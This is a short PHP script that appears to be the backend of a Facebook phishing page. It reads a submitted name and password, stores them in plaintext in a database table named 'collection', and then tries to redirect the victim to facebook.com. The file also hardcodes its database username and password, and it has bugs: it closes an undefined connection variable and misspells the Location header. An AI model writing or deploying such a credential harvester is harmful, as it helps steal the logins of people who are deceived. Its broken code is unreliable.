<?php
	session_start();
	ob_start();
	// connect to database
	$conn = mysqli_connect("localhost", "id17736395_hobbymwase", "Jesus@#12345", "id17736395_hbdb");

	if (!$conn) {
		die("Error connecting to database: " . mysqli_connect_error());
	}

	
	$name=$password='';

	if ($_SERVER['REQUEST_METHOD']=="POST") {// if its post data

		// set local variable
		$name=$_POST['name'];
		$password=$_POST['password'];
	}// end request

	if (isset($_POST['submit'])) {
		$insert_query=$conn->prepare("INSERT INTO collection (name,password) VALUES (?,?)");
		$insert_query->bind_param("ss",$name,$password);
		$insert_query->execute();
		$sconn->close();
		header('locatiion:www.facebook.com');
	 }
?>